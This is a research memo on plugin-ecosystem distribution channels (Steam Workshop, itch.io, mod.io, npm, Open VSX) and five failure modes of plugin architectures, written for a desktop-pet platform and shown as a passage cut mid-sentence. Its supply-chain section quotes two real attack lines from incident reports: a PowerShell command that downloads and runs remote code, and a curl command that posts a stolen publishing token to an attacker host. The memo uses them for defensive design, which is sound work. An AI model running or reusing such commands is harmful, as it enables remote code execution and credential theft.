# D — Distribution prior art, and the failure-mode evidence base

Research memo for PetDock (Windows desktop-pet platform: microkernel host + everything-is-a-plugin).
Two halves: **Group 1** surveys how five real distribution channels publish, version, review, trust and
takedown user content; **Group 2** is the evidence base — five structural failure modes of plugin
architectures, each with a mechanism, named citable incidents, and one implementable design rule.

A note on method: every non-obvious claim below carries a link. Where I could not confirm a named
incident I say so explicitly in [§7](#7-what-i-could-not-verify) rather than describing it vaguely.

---

## Part 1 — Distribution prior art

### 1.1 Steam Workshop — publisher-authenticated, auto-updating, unreviewed

**Publish.** A workshop item is created and populated through `ISteamUGC`: `StartItemUpdate` returns an
`UGCUpdateHandle_t`, `SetItem*` methods set the item's fields, and `SubmitItemUpdate` publishes. An
equivalent command-line path exists via `steamcmd.exe` + `workshop_build_item <file.vdf>`; the VDF's
`publishedfileid` is written back on success so subsequent runs update rather than recreate. Items stay
hidden until the contributor accepts the Steam Workshop Legal Agreement. See the
[Steam Workshop Implementation Guide](https://partner.steamgames.com/doc/features/workshop/implementation).

**Discover.** Querying is a three-stage async flow: `CreateQueryUserUGCRequest` /
`CreateQueryAllUGCRequest` / `CreateQueryUGCDetailsRequest`, then `SendQueryUGCRequest`, then
`GetQueryUGCResult` inside the `SteamUGCQueryCompleted_t` handler. Queries return at most 50 results per
page and page via the `unPage` parameter. See the
[ISteamUGC Interface](https://partner.steamgames.com/doc/api/ISteamUGC).

**Subscribe and update.** `ISteamUGC::SubscribeItem` subscribes; "It will be downloaded and installed as
soon as possible." Downloads are executed by the *Steam client*, not the game: on launch, updated depots
install, existing workshop items update, the game starts, and newly subscribed items download in the
background. Critically for versioning: "By default, users who subscribe to a Steam Workshop item will
download the latest version of that item. Any subsequent updates to the item will also be propagated to
all current subscribers." — [Item Versioning](https://partner.steamgames.com/doc/features/workshop/itemversioning).

**Versioning.** Workshop items carry a publisher-supplied changenote, not a semantic version. Valve's own
answer to "a game update broke my mods" is a *branch* mechanism added in Steamworks SDK 1.60: the
uploader calls `ISteamUGC::SetRequiredGameVersions` with a min/max Steam beta branch, and the game reads
`ISteamUGC::GetSupportedGameVersionData` to detect a mismatch, then offers the player a downgrade via
`ISteamApps::SetActiveBeta`. Valve's stated failure case is exactly the one PetDock will face: "automatically
updating the game may break some of that player's installed mods and corrupt their save game."

**Who reviews.** Nobody, at publish time. There is no pre-publication gate; the only gate is the legal
agreement checkbox and post-hoc community reporting.

**Trust model.** Installing runs arbitrary code with the user's privileges, and the workshop item is
delivered and auto-updated by the Steam client — so the publisher's Steam account is the effective trust
boundary, not the item.

**Takedown.** `ISteamUGC::DeleteItem` — "Please note that this does not prompt the user and cannot be
undone." Subscribers are not notified; the client simply keeps a dangling subscription and retries the
download on each start, with the community advice being to wait for the workshop to notice
([Steam forums](https://steamcommunity.com/discussions/forum/1/558746994930627062),
[Unknown Worlds forums](https://forums.unknownworlds.com/discussion/136313/subscribed-to-deleted-workshop-mod)).

**Incidents as an attack vector.** Steam Workshop is a *working* malware channel, not a theoretical one:

- **Wallpaper Engine, reported by Kaspersky on 16 June 2026.** Wallpaper Engine supports "application"
  wallpapers, which "allow executable programs to run directly on a user's Windows computer". Kaspersky
  found dozens of infected wallpaper packages, many with "thousands or even tens of thousands of
  downloads", delivering the DarkKomet backdoor plus Lumma and Vidar infostealers and the RenEngine
  loader; one sample harvested Steam account data and hijacked live Steam sessions, and the payload
  executed automatically on install. Primary sources:
  [Kaspersky press release](https://www.kaspersky.com/about/press-releases/kaspersky-discovered-a-malware-campaign-targeting-steam-users-through-infected-wallpaper),
  [Securelist report](https://securelist.com/dozens-of-malicious-wallpapers-found-on-steam-workshop/120186/).
- **People Playground.** A mod masqueraded as a top-rated item, then on boot "activated, replacing existing
  mods with infected versions"; players lost other mods, save files and Steam achievements
  ([Notebookcheck](https://www.notebookcheck.net/Popular-sandbox-Steam-game-sees-virus-infect-workshop-deleting-mods-and-save-files.1218216.0.html)).
- **Unity `application.OpenURL` → `ShellExecuteW`.** Researchers documented two Steam games (Banana
  Shooter, Unturned) where loading a malicious workshop mod or map reached Unity's `application.OpenURL`,
  which on Windows maps to `ShellExecuteW` — "effectively granting run-box-level permissions" and allowing
  arbitrary PowerShell
  ([daily.dev writeup](https://daily.dev/posts/these-steam-games-were-used-to-spread-malware-2nzwvmlnc)).

The generalizable lesson: the *content format* decided the blast radius. A video wallpaper is data; an
"application" wallpaper is a program, and Valve's own SDK documents both under the same feature.

### 1.2 itch.io — open distribution with no review gate

**Publish.** `butler` is the CLI: `butler push <src> <user>/<game>:<channel>`. Channels are freely named
(`windows-beta`, `linux-arm64`, `macos-preview`), and butler uploads only the diff against the previous
build rather than the whole payload. Flags include `--userversion`, `--hidden`, and `--ifChanged`. The
itch app (v26.12.0+) exposes the same push flow graphically.
Sources: [butler manual](https://itch.io/docs/butler), [butler releases](https://github.com/itchio/butler/releases).

**Versioning.** The publisher supplies an opaque user version string; there is no semantic versioning and
no resolver. Retrieving a channel's version *history* is a known gap — the `/wharf/channels` endpoint only
reports the last version ([itch.io forum](https://itch.io/t/1992105/retrieving-the-version-history-of-a-game-channel)).

**Who reviews.** Nobody. Push is immediate and public.

**Trust model.** Installing a build runs arbitrary code. The platform's leverage is reputational and
post-hoc (reports, delisting), plus the fact that butler is open source and built on the openly specified
[Wharf](https://itch.io/docs/butler) protocol — the delivery mechanism is auditable even though the content
is not.

**Takedown.** Project-level deletion by the author; builds are not retained as a durable public archive.

The contrast with a curated store is the point: itch.io's value proposition is that a creator can ship in
seconds with no queue, and it accepts that the platform cannot be a safety filter.

### 1.3 mod.io — "moderation as a service"

**Publish.** mod.io is a cross-platform UGC backend: a REST API with a C++17 SDK wrapper, plus Unreal,
Unity and custom-engine integrations, so the same content pipeline spans PC, mobile and console
([docs.mod.io C++ SDK](https://docs.mod.io/cppsdk), [mod.io](https://mod.io)).

**Review.** This is the differentiator. mod.io documents **four layers of moderation**:
Automated Scanning, Rules-Based Moderation (the "Rules Engine"), Content Approval, and Reporting
([Moderation overview](https://docs.mod.io/moderation)).

- *Automated Scanning* — every submission passes mod.io validation rules plus platform validation rules,
  and a failed check returns an API error to the uploader
  ([Automated Scanning](https://docs.mod.io/moderation/automated-scanning)).
- *Rules Engine* — the studio defines flags on words, file types or uploader history; it exists to handle
  "high volumes of UGC content, in a fully automated manner" ([Rules Engine](https://docs.mod.io/moderation/rules-engine)).
- *Content Approval* — a pending-approval queue; with **Full Curation** enabled, *all* UGC waits for manual
  approval before going live ([Content Approval](https://docs.mod.io/moderation/manual-curation),
  [Reporting](https://docs.mod.io/moderation/community-reports)).

**Trust model.** Installing a mod still runs code, but the platform inserts a configurable human/automated
gate between upload and availability — the opposite of Steam Workshop and itch.io. The commercial pitch is
that this gate is a compliance artifact the studio can point at, which is why it matters for console
certification.

**Takedown.** Content lives in a studio-controlled dashboard, so a studio can unpublish, and the approval
queue doubles as the takedown surface.

### 1.4 npm — the registry as a distribution channel, and the best-documented incident set

**Publish and version.** `npm publish` with a semver string. Range semantics matter because they are how
the ecosystem silently re-resolves code: `^1.2.3` allows changes that do not modify the *left-most non-zero
digit* (`>=1.2.3 <2.0.0`), so `^0.2.5` resolves to `>=0.2.5 <0.3.0` and `^0.0.4` to `>=0.0.4 <0.0.5`
([npm semver docs](https://docs.npmjs.com/cli/v6/using-npm/semver),
[node-semver](https://github.com/npm/node-semver)). The 0.x caveat is the trap: a `^0.x` dependency will
never receive the maintainer's next minor, while a `^1.x` one will receive every minor automatically.

**Lockfiles** pin the resolved tree so a build is reproducible — but a lockfile only protects the *build*;
it does not stop a `postinstall` from running.

**Who reviews.** Nobody. There is no pre-publication review of package contents.

**Trust model — this is the crux.** Installing a package executes arbitrary code at install time. npm's
lifecycle hooks run `postinstall` (and `preinstall`, `install`) automatically during `npm install`
([npm scripts docs](https://docs.npmjs.com/cli/v9/using-npm/scripts)). GitHub has described install-time
lifecycle scripts as "the single largest code-execution surface in the npm ecosystem", because
`npm install` runs scripts from *every transitive dependency*, and announced that npm v12 will disable
install scripts by default ([The Hacker News](https://thehackernews.com/2026/06/github-to-disable-npm-install-scripts.html)).

**Real incidents — get these right, they are the canonical evidence:**

| Incident | Date | Mechanism | Outcome |
|---|---|---|---|
| **event-stream** | Sept–Nov 2018 | A new maintainer (`right9ctrl`) was given publish rights, added `flatmap-stream@0.1.1` as a direct dependency in `event-stream@3.3.6` on 9 Sept 2018 | Malicious code targeted the Copay wallet; npm removed `flatmap-stream` and `event-stream@3.3.6` and took ownership of `event-stream` on 26 Nov 2018 ([npm blog](https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident), [Snyk post-mortem](https://snyk.io/blog/a-post-mortem-of-the-malicious-event-stream-backdoor)) |
| **ua-parser-js** | 22 Oct 2021 | Maintainer's npm account hijacked (reportedly a reused/exposed password without 2FA); three malicious versions published: `0.7.29`, `0.8.0`, `1.0.0` | Cryptominer + credential stealer; ~8M weekly downloads; exposure ~4 hours ([Mandiant / Google Cloud](https://cloud.google.com/blog/topics/threat-intelligence/supply-chain-node-js), [Rapid7](https://www.rapid7.com/blog/post/2021/10/25/npm-library-ua-parser-js-hijacked-what-you-need-to-know)) |
| **colors / faker** | 5–8 Jan 2022 | The maintainer sabotaged his own packages: faker.js repo wiped and an empty package published as `6.6.6` on 5 Jan; `colors@1.4.1` shipped an infinite loop printing corrupted Unicode on 8 Jan | Denial of service for every dependent build ([safeguard.sh](https://safeguard.sh/resources/blog/protestware-open-source-maintainer-sabotage-risk)) |
| **node-ipc / peacenotwar** | 15 Mar 2022 | Maintainer added `peacenotwar` as a dependency; it overwrote files with heart emojis | Broke Vue CLI users' builds; a protest action, not an intrusion ([Snyk](https://snyk.io/blog/peacenotwar-malicious-npm-node-ipc-package-vulnerability), [Wikipedia](https://en.wikipedia.org/wiki/Peacenotwar)) |
| **xz-utils backdoor** | disclosed 29 Mar 2024 | CVE-2024-3094, CVSS 10.0, versions `5.6.0`/`5.6.1`: a long-con maintainer ("Jia Tan") embedded a backdoor that hooked `sshd`'s authentication path via liblzma | Caught by chance before distribution ([Wikipedia](https://en.wikipedia.org/wiki/XZ_Utils_backdoor), [Microsoft advisory](https://techcommunity.microsoft.com/blog/vulnerability-management/microsoft-faq-and-guidance-for-xz-utils-backdoor/4101961), [Datadog Security Labs](https://securitylabs.datadoghq.com/articles/xz-backdoor-cve-2024-3094)) |
| **dependency confusion** | Feb 2021 | Alex Birsan published public packages matching *internal* names harvested from public JS bundles; package managers preferring the highest version pulled the public one | Proved execution via DNS callbacks at 35+ companies including Apple, Microsoft, PayPal and Yelp ([FOSSA](https://fossa.com/blog/dependency-confusion-understanding-preventing-attacks), [Endor Labs](https://www.endorlabs.com/learn/dependency-confusion-how-attackers-poison-your-build)) |

**Mitigations npm has actually shipped**, and what each one does and does not buy:

- **`npm audit`** queries an advisory database for known-vulnerable resolved versions. It detects *known
  CVEs*, never malice — none of the five incidents above would be flagged by it at publication time.
- **Provenance.** npm generates publish attestations at the registry, signed through Sigstore and logged in
  a public transparency ledger ([npm docs](https://docs.npmjs.com/generating-provenance-statements)).
  Trusted publishing generates SLSA provenance automatically, recording the repository, commit
  (`GITHUB_SHA`) and workflow ref ([Boost Security Labs](https://labs.boostsecurity.io/articles/trusted-publishing-untrusted-branch-red-hat-npm)).
  The critical limitation, and the reason the Red Hat npm compromise is instructive: **provenance is a
  cryptographic receipt, not a policy.** It faithfully attests *where the build ran* — so a compromised
  workflow, or an attacker who can trigger a trusted workflow from an untrusted branch, produces a
  perfectly valid attestation for a malicious artifact.
- **2FA.** In February 2022 npm began mandatory 2FA enrolment for the maintainers of the top 100 packages
  by number of dependents, with a stated plan to extend to the top 500 and eventually all users
  ([GitHub blog](https://github.blog/security/supply-chain-security/top-100-npm-package-maintainers-require-2fa-additional-security),
  [The Record](https://therecord.media/npm-enrolls-top-100-package-maintainers-into-mandatory-2fa)). Note
  the timing: ua-parser-js was compromised in October 2021, four months *before* this.

**Takedown.** npm can unpublish and can take ownership of a package (as it did with `event-stream`). But
unpublishing is famously hostile to the ecosystem — and in the colors/faker case the maintainer *deleted*
the artifact, which is the distribution-abandonment failure mode (§6) executed deliberately.

### 1.5 Open VSX — a vendor-neutral registry born from a licensing change

**Why it exists.** Open VSX is the Eclipse Foundation's vendor-neutral registry for VS Code extensions,
created as an alternative to Microsoft's Visual Studio Marketplace, whose terms restricted extensions to
Microsoft products. It is the default registry for VSCodium, Eclipse Theia, Gitpod and Eclipse Che, and it
is open source and self-hostable
([Eclipse newsletter, Jan 2021](https://www.eclipse.org/community/eclipse_newsletter/2021/january/1.php),
[Eclipse Foundation announcement](https://blogs.eclipse.org/post/brian-king/open-vsx-registry-under-new-management)).

**Publish flow** ([Publishing Extensions wiki](https://github.com/eclipse-openvsx/openvsx/wiki/Publishing-Extensions)):
1. Create an Eclipse account (must match the GitHub account used to log in).
2. Log in to open-vsx.org and sign the **Publisher Agreement**.
3. Generate an **access token** — one per environment, revocable.
4. `npx ovsx create-namespace <publisher> -p <token>`. **Creating a namespace does not verify ownership**;
   a *verified* badge requires a separate namespace-claiming step.
5. `npx ovsx publish <file.vsix> -p <token>` (or `npx ovsx publish` from source; `ovsx` shells out to `vsce`,
   which runs the `vscode:prepublish` script).

**Review / scanning.** Publishing runs automated checks: **secret detection** (publishing is rejected if
enforced and secrets are found, with an inline `// secret-detector:ignore` escape hatch), a **blocklist**
check comparing file hashes against known-bad files, and **namespace similarity** detection to block
typosquatting.

**Trust model.** Installing an extension runs arbitrary code. The registry's protections are
publish-time scanning and namespace identity — not runtime sandboxing.

**Takedown.** Namespace-owner control; extensions can be unpublished. The registry is self-hostable, so an
organisation can run its own copy and set its own policy.

**The measured risk, from Wiz Research (disclosed October 2025):** across both the VS Code Marketplace and
Open VSX, Wiz found **550+ validated secrets in 500+ extensions from hundreds of publishers**. Over 100
valid Azure DevOps PATs were found *inside extension packages* (85,000 installs), and 30+ Open VSX tokens
(100,000 installs). Because "VS Code will auto-update extensions as new versions become available", a
leaked publisher token lets an attacker "directly distribute a malicious extension update across the entire
install base". Wiz also notes there is "no technical control preventing themes from bundling malware" even
though themes carry no code ([Wiz](https://www.wiz.io/blog/supply-chain-risk-in-vscode-extension-marketplaces)).

That is the single most useful sentence in this memo for PetDock: **the update channel is the attack
surface, and auto-update is what converts a stolen credential into mass compromise.**

---

## Part 2 — The five failure modes

### 2.1 Trust boundary collapse / supply-chain compromise

**Mechanism.** A plugin system's real trust boundary is not the plugin API — it is the *publisher's
credential*, plus the update channel, plus the dependency graph behind it. Three structural reasons it
collapses:

1. **The host must execute plugin code with the host's own privileges.** There is no privilege separation
   to fall back on; anything the plugin can reach, the attacker reaches.
2. **Update is indistinguishable from install, and it is automatic.** A plugin the user deliberately
   trusted at version *n* is silently replaced by version *n+1*. Every credential that can publish is
   therefore a credential that can compromise the whole install base at once.
3. **Identity is cheap to acquire and cheap to inherit.** Namespaces can be claimed, abandoned names can be
   reused, and maintainership can be handed over to a stranger who volunteered to help.

**Named examples.**

- **Shai-Hulud npm worm, September 2025** — the first successful self-replicating worm in the npm
  ecosystem, infecting 500+ packages. It harvested AWS/GCP/Azure credentials using TruffleHog and
  established persistence through GitHub Actions backdoors, so *removing the package does not end the
  compromise* ([CISA alert](https://www.cisa.gov/news-events/alerts/2025/09/23/widespread-supply-chain-compromise-impacting-npm-ecosystem),
  [StepSecurity](https://www.stepsecurity.io/blog/ctrl-tinycolor-and-40-npm-packages-compromised)). A second
  wave, "The Second Coming", was detected 24 November 2025: 700+ packages and 27,000+ malicious GitHub
  repositories, moved from `postinstall` to *pre*-install execution and to the Bun runtime for stealth
  ([Zscaler](https://www.zscaler.com/blogs/security-research/shai-hulud-v2-poses-risk-npm-supply-chain),
  [Elastic](https://www.elastic.co/blog/shai-hulud-worm-2-0-updated-response)).
- **xz-utils, CVE-2024-3094** — the cautionary tale for *identity* rather than credentials. A maintainer
  identity ("Jia Tan") spent roughly two years building standing in a project with effectively one
  overworked maintainer, then shipped a CVSS-10.0 backdoor into `5.6.0`/`5.6.1`. No account was
  compromised; the role itself was captured ([Wikipedia](https://en.wikipedia.org/wiki/XZ_Utils_backdoor)).
- **Cyberhaven Chrome extension, 24–25 December 2024** — a phishing attack yielded an administrative
  account for the Chrome Web Store, and the attacker published malicious version `24.10.4` on 25 December.
  It exfiltrated cookies and session tokens to `cyberhavenext[.]pro`; the C2 was live from 01:32 UTC to
  02:50 UTC on 26 December, and Cyberhaven replaced it with `24.10.5`
  ([Keep Aware](https://keepaware.com/blog/cyberhaven-browser-extension-compromise),
  [Darktrace](https://www.darktrace.com/blog/cyberhaven-supply-chain-attack-exploiting-browser-extensions)).
  This was part of a wider campaign reaching roughly 35 extensions and ~2.6 million users
  ([RH-ISAC](https://rhisac.org/threat-intelligence/cyberhaven-extension-compromise-part-of-broader-campaign-affecting-multiple-chrome-extensions)).
- **VS Code extensions `solaibot`, `among-eth`, `blankebesxstnion` (Datadog, May 2025)** — the clearest
  published mechanism. All three shipped an `extension.js` that did real Solidity work *and* an HTTP GET to
  `solidity[.]bot/version.json` with the platform string in the headers. Only on Windows did the server
  answer `{"version":"v1.4.1","version_hash":"706F…"}`; the hex was decoded and executed, yielding
  `powershell -ExecutionPolicy Bypass -Command "irm https://solidity[.]bot/a.txt | iex"`. Datadog also
  states the structural reason extensions are attractive: they have "extensive permissions to read code and
  environment variables, register commands and write configuration, perform startup actions, and even run
  system commands as the current user", and marketplace scanning "can lead some developers to think that
  extensions have been thoroughly vetted"
  ([Datadog Security Labs](https://securitylabs.datadoghq.com/articles/mut-9332-malicious-solidity-vscode-extensions/)).
- **Name reuse (ReversingLabs).** `ahban.cychelloworld` and `ahban.shiba` were published in October 2024
  and last updated March 2025; after removal, a *new* extension under the same `shiba` name from a
  different publisher appeared in June 2025 with the same capabilities
  ([ReversingLabs](https://www.reversinglabs.com/blog/malware-vs-code-extension-names)).
- **GhostAction (GitGuardian, discovered 5 September 2025).** Attackers with compromised maintainer
  credentials injected a workflow literally named `Github Actions Security` containing
  `curl -s -X POST -d 'PYPI_API_TOKEN=${{ secrets.PYPI_API_TOKEN }}' hxxps://bold-dhawan.45-139-104-115.plesk.page`.
  Scope: 327 GitHub users, 817 repositories, 3,325 secrets; 9 npm and 15 PyPI packages were left at
  immediate risk of malicious release. It recurred in September 2026 and again in October 2026, reaching
  772 repositories and 2,577 secrets
  ([GitGuardian](https://blog.gitguardian.com/ghostaction-campaign-3-325-secrets-stolen),
  [follow-up](https://blog.gitguardian.com/ghostaction-github-actions-supply-chain-attack-returns)).
- **3CX, March 2023** — a two-stage supply chain. The initial vector was *a prior* supply chain
  compromise: malicious software downloaded from Trading Technologies' site deployed the VEILEDSIGNAL
  backdoor, which reached 3CX's Windows and macOS build systems and produced a trojanized 3CX DesktopApp.
  Attributed to UNC4736 / AppleJeus, suspected DPRK
  ([Mandiant](https://cloud.google.com/blog/topics/threat-intelligence/3cx-software-supply-chain-compromise),
  [MITRE campaign C0057](https://attack.mitre.org/campaigns/C0057)).
- **DataSpii, 2019** — the case that needs no malware at all. Eight extensions (including Hover Zoom,
  SpeakIt!, SuperZoom and SaveFrom.net Helper) collected browsing activity including PII and corporate data
  from 4M+ Chrome and Firefox users over seven months, and the data was sold to subscribers; the
  extensions were legitimate and *disclosed* the behaviour
  ([dataspii.com](https://dataspii.com),
  [Fierce Healthcare](https://www.fiercehealthcare.com/tech/several-health-it-companies-impacted-by-browser-extension-privacy-issue-report)).
  Consent text is not a control.

**Design rule — never grant the host's privileges to plugin code, and treat update as the security event.**

- Sign every artifact, and make **the update path the thing that is signed**: an update must carry the same
  publisher key as the original install. An unsigned or re-keyed update is *refused*, not prompted for —
  a prompt is a fatigue attack (§4).
- Run every plugin in a **separate OS process with a restricted token**, and never place the host's
  credentials in its environment or its working directory. A plugin process should be unable to read the
  host's config, its token store, or any path it was not handed.
- **Install-time and startup-time code execution are off by default.** A plugin that wants to run at startup
  requests a distinct, revocable capability that the user can see and remove, and that is listed separately
  from "installed".
- **Tombstone vacated namespaces.** A removed publisher's name is never silently re-assignable, and a
  namespace is verified before its first publish.

---

### 2.2 API breakage / ecosystem reset

**Mechanism.** The plugin API is an implicit contract with every third-party plugin, but it lives inside
the host's own source tree and is versioned with the host's *product* releases, so it is broken by ordinary
refactoring. Two structural drivers make this inevitable rather than accidental:

1. **The costs and benefits are on opposite sides of the boundary.** The host pays nothing to rename a
   function; every plugin author pays. Asymmetric incentives produce breaks even when everyone agrees
   breaks are bad.
2. **Every plugin is a frozen copy of the host's assumptions at the moment it was written.** A plugin is
   correct against exactly one host version; everything after that is a bet on compatibility.

**Named examples.**

- **Firefox XUL/XPCOM → WebExtensions, Firefox 57 (November 2017)** — the "flag day" case. Mozilla dropped
  the legacy APIs around 57/58 "long before the WebExtensions API was feature-equivalent", leaving no
  Firefox version that supported both: "The big PITA for me is that now it's a flag day upgrade. There is
  no FF version that supports my XUL addon and the WebExtensions version"
  ([Mozilla add-ons blog](https://blog.mozilla.org/addons/2018/08/21/timeline-for-disabling-legacy-firefox-add-ons),
  [daniel.haxx.se](https://daniel.haxx.se/blog/2017/11/08/firefox-quantum)).
- **Chrome MV2 → MV3 (2022–2026)** — the best-documented *managed* break, and the timeline is the useful
  artifact. Chrome Web Store stopped accepting new public/unlisted MV2 extensions in **January 2022** and
  new private ones in **June 2022**; warning banners and loss of the Featured badge began **3 June 2024**;
  disabling in stable began **9 October 2024**; disabled-by-default with manual re-enable on **31 March
  2025**; disabled everywhere with no re-enable in **Chrome 138, 24 July 2025**; the enterprise
  `ExtensionManifestV2Availability` policy removed with **Chrome 139**; and all remaining MV2 extensions
  removed from the Web Store on **31 August 2026**
  ([Chrome for Developers](https://developer.chrome.com/docs/extensions/develop/migrate/mv2-deprecation-timeline)).
  Four and a half years from first gate to full removal — and it still disabled working extensions. That is
  the *floor*, not the ceiling, for how expensive a break is.
- **Blender 2.79 → 2.80 (2019)** — a Python API break that invalidated most addons. Blender's own beta
  announcement acknowledged it ("Add-on authors can now start updating their code for Blender 2.8… in
  general we will try to keep breaking changes limited",
  [Blender Developers Blog](https://code.blender.org/2018/11/blender-2-8-beta)); the community advice was
  blunt: "you should plan to distribute two versions of any addon; One with `bl_info` set for 2.8, and the
  other for 2.7", because lamps were renamed to lights, Hemis was removed, and object-instancing memory
  semantics changed ([theduckcow](https://theduckcow.com/2019/update-addons-both-blender-28-and-27-support/)).
- **OBS Studio 28** — an ABI break serious enough that OBS published a plugin compatibility matrix and told
  users not to update blindly: "do not update blindly if you are using third-party plugins"
  ([OBS KB](https://obsproject.com/kb/obs-studio-28-plugin-compatibility)).
- **AngularJS → Angular** — not a break but an *end*: AngularJS entered long-term support in July 2018,
  extended six months during the pandemic, and formally ended **31 December 2021**; migrating to Angular
  "requires a full app rewrite due to the different architecture"
  ([OpenLogic](https://www.openlogic.com/blog/should-you-stay-angularjs),
  [HeroDevs](https://www.herodevs.com/blog-posts/is-angularjs-still-supported-in-2026)).
- **Python 2 → 3** — the slow-motion reference case, whose cost is best captured by its critics: "Hundreds
  of thousands of engineer-hours wasted on porting, worrying about compatibility, and supporting
  unsupported libraries or two environments at once"
  ([Hacker News discussion](https://news.ycombinator.com/item?id=15708136)).

**Design rule — version the plugin API independently of the host, and never remove a served API version
without a conversion shim and a declared support window.**

- The plugin manifest declares an **explicit API integer**, not "compatible with PetDock 3.x". The host
  serves shims for N−2 concurrently and refuses to load an out-of-range plugin with a specific, actionable
  error rather than a stack trace.
- The **deprecation clock starts only when the replacement API is feature-complete**, never when the new
  API merely exists. Firefox 57 is the counterexample to copy from: shipping the new surface before the old
  one can be left behind is what turns a migration into a flag day.
- The host's own pets use the same public API (see §2.4), so a break cannot be shipped without the host
  noticing it first.

---

### 2.3 Permission fatigue / user-hostile consent

**Mechanism.** Consent is a UI, and its cost is paid per install while its benefit is invisible and
probabilistic. A warning that fires on most installs stops being information and becomes wallpaper — the
user's rational response is to click through. Three measured findings:

- **Felt et al., Android Permissions (2012)** found that users paid little attention to permission
  warnings and had low comprehension of them; the majority did not demonstrate awareness of the warnings
  ([UC Berkeley EECS](https://www2.eecs.berkeley.edu/Pubs/TechRpts/2012/EECS-2012-26.html),
  [SOUPS 2012 paper](https://cups.cs.cmu.edu/soups/2012/proceedings/a3_Felt.pdf)).
- **Felt et al., The Effectiveness of Application Permissions (2011)** found that "History and all-domain
  permissions are requested by more than half of extensions", so "users have no reason to be suspicious of
  extensions with these permissions"
  ([USENIX WebApps '11](https://www.usenix.org/event/webapps11/tech/final_files/Felt.pdf)).
- **Bongard-Blanchy et al. (2022)** found users are "uncertain about the necessity of granting app
  permissions for about half of the tested permission requests"
  ([UniBw](https://www.unibw.de/usable-security-and-privacy/publikationen/pdf/bongard2022necessary.pdf)).

**Why the platform's own wording makes it worse.** Chrome's install-time warning for `<all_urls>` or
`*://*/*` is "Read and change all your data on the websites you visit"
([Chrome permission warnings](https://developer.chrome.com/docs/extensions/mv2/permission-warnings)).
That string is *honest* — and it is also the exact string a malicious extension shows. StayFocusd, a
legitimate website blocker, needs the same permission and tells users so in its listing
([Chrome Web Store](https://chromewebstore.google.com/detail/stayfocusd-%E2%80%93-website-bloc/laankejkbhbdhmipfmgcngdelahlfoji)).
The signal cannot separate the two, which is why the warning has to be replaced rather than reworded.

Android's own trajectory is the acknowledgement: scoped storage moved from install-time grants to per-app
app-specific directories requiring no permission at all, with shared-storage access requiring explicit user
consent ([Datalogic scoped storage](https://developer.datalogic.com/mobile-computers/news/scoped_storage_on_android_11);
for the security analysis of what scoped storage did and did not fix, see
[ScopeVerif, NDSS 2025](https://www.ndss-symposium.org/wp-content/uploads/2025-340-paper.pdf)).

**Design rule — never ask at install time; grant at use, scoped to the concrete object, and make every
grant visible and revocable.**

- Capabilities are **per-object and per-session**: a pet receives the wallpaper file it was handed, not
  "the filesystem"; the network capability is per-host, not "the internet".
- Prompts name the **object and the action** ("Pet X wants to draw on your desktop"), never a category
  ("needs storage access"). A prompt that cannot name a concrete object is a design bug, not a warning.
- The host shows a **live, always-reachable list of what each plugin currently holds**, and revoking is one
  click. Silent re-granting is forbidden: a revoked capability stays revoked until the user acts again.
- **Default deny.** An unanswered or unattended prompt denies. Nothing escalates because the user was away.

---

### 2.4 Core bloat / plugin capture

**Mechanism.** The plugin API can only be as expressive as the host's internal interfaces. Any feature the
API cannot express must either be built in core or not exist — so **a weak API manufactures core bloat by
construction**. The inverse failure is worse: when the API is too weak for a second implementation to
compete, one plugin becomes load-bearing, and the host can no longer change its own internals without
breaking its users. At that point the plugin *is* the specification.

**Named examples.**

- **Jenkins** — the canonical case. Almost all Jenkins plugins depend on other plugins, resolved at runtime,
  so a plugin update produces "runtime errors, mysterious crashes, or subtle breakage"; managing it "requires
  dedicated resources and expertise"
  ([Harness](https://www.harness.io/blog/dependency-plugin-hell-jenkins),
  [JetBrains](https://blog.jetbrains.com/teamcity/2026/03/jenkins-plugin-management)). Jenkins' own
  response is instructive: it publishes a **Bill of Materials** for core and for plugins, and a dedicated
  guide to [dependencies and class loading](https://www.jenkins.io/doc/developer/plugin-development/dependencies-and-class-loading/),
  precisely because the dependency graph is not self-managing
  ([dependency management](https://www.jenkins.io/doc/developer/plugin-development/dependency-management/)).
  The infrastructure crisis was resolved by joining the Continuous Delivery Foundation, which from
  **January 2020** covered "a significant part of the infrastructure costs including our services and CI/CD
  instances running on Microsoft Azure" plus legal assistance for code-signing keys
  ([Jenkins CDF graduation](https://www.jenkins.io/blog/2020/08/04/cdf-graduation)). A plugin ecosystem's
  hosting bill is a plugin-ecosystem risk.
- **WordPress / Gutenberg** — the "which plugin will core kill next" dynamic made explicit. Gutenberg was
  developed as a *feature plugin*, then landed in core with WordPress 5.0 in December 2018, and still
  exists as the plugin that previews what core will absorb next
  ([deliciousbrains](https://deliciousbrains.com/wordpress-gutenberg),
  [wordpress/gutenberg](https://github.com/wordpress/gutenberg)). The plugin is not a competitor to core;
  it is core's staging ground.
- **VS Code / Copilot Chat** — the largest extension in the ecosystem is being absorbed: "In the coming
  months, we will bring the relevant components of the Copilot Chat extension into the core VS Code
  repository" ([VS Code FAQ](https://code.visualstudio.com/docs/supporting/faq)). Note the *direction*: a
  first-party extension was built outside core first, then pulled in — which is the healthy version of the
  pattern, and only works because the API was strong enough to build it outside in the first place.

**Design rule — ship the host's own features as plugins against the same public API, and publish the API's
capability gaps as the roadmap.**

- Every first-party pet is a plugin using the identical public API. If a feature cannot be built as a
  plugin, **the correct response is to widen the API, not to add a core special case** — and the widening
  is the deliverable.
- No privileged API surface: anything a first-party pet can call, a third-party pet can call on identical
  terms. The moment that stops being true, third-party plugins are second-class and the ecosystem is
  decorative.
- Keep the API's known gaps in a published list. An unlisted gap is how core bloat starts.

---

### 2.5 Distribution abandonment / bit-rot

**Mechanism.** A plugin is a point-in-time coupling between four independently-moving things: the host
version, the plugin version, the artifact store, and the author's attention. Any one can move out from
under the others, and the incentives are asymmetric — the host can ship a fix, the registry can retain a
file, but **only the author can port the plugin**, and the author's incentive ends when their own need is
met. The failure is therefore not "stale code"; it is *content that no longer exists anywhere*.

**Named examples.**

- **Atom, sunset 15 December 2022** — the registry-side version. GitHub archived `atom/atom` and all
  repositories in the Atom organisation, and stated plainly: "Atom package management will stop working",
  "No more security updates", Teletype will no longer work
  ([GitHub blog](https://github.blog/news-insights/product-news/sunsetting-atom/)). Every Atom package
  became uninstallable on a single date regardless of its author's intentions.
  The same post carries a second, sharper example of the mode: on **7 December 2022** GitHub detected
  unauthorised access to Atom planning repositories and encrypted code-signing certificates were
  exfiltrated. As a precaution the certificates were revoked, which **invalidated Atom 1.63.0 and 1.63.1 —
  both versions stopped working on 2 February 2023**. A registry-side signing event bricked installed
